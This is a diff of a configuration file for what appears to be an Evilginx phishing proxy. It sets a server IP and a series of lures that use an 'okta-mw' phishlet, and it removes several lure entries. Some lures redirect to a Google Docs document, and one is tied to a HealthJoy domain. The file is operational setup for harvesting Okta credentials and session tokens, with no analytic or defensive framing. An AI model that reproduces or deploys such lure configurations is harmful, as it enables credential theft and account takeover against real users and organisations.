@@ -2,30 +2,8 @@ blacklist_mode: "off"
 ip: 3.80.70.47
 lures:
 - hostname: ""
-  path: /JaNuxUgl
-  redirect_url: https://www.google.com
-  phishlet: okta-mw
-  template: ""
-  ua_filter: ""
-  info: ""
-  og_title: ""
-  og_desc: ""
-  og_image: ""
-  og_url: ""
-- hostname: ""
   path: /sypuwbPa
   redirect_url: ""
-  phishlet: okta-mw
-  template: ""
-  ua_filter: ""
-  info: ""
-  og_title: ""
-  og_desc: ""
-  og_image: ""
-  og_url: ""
-- hostname: ""
-  path: /
-  redirect_url: https://docs.google.com/document/d/1hi-rSGcsQDdOFJ3CKA0YrCtibaLpJjlDbrMuFv0cID8/edit
   phishlet: okta-mw
   template: ""
   ua_filter: ""
@@ -92,17 +70,6 @@ lures:
 - hostname: ""
   path: /healthjoy
   redirect_url: https://mygroups.healthjoy.com/
-  phishlet: okta-mw
-  template: ""
-  ua_filter: ""
-  info: ""
-  og_title: ""
-  og_desc: ""
-  og_image: ""
-  og_url: ""
-- hostname: ""
-  path: /FuIbKfVV
-  redirect_url: ""
   phishlet: okta-mw
   template: ""
   ua_filter: ""
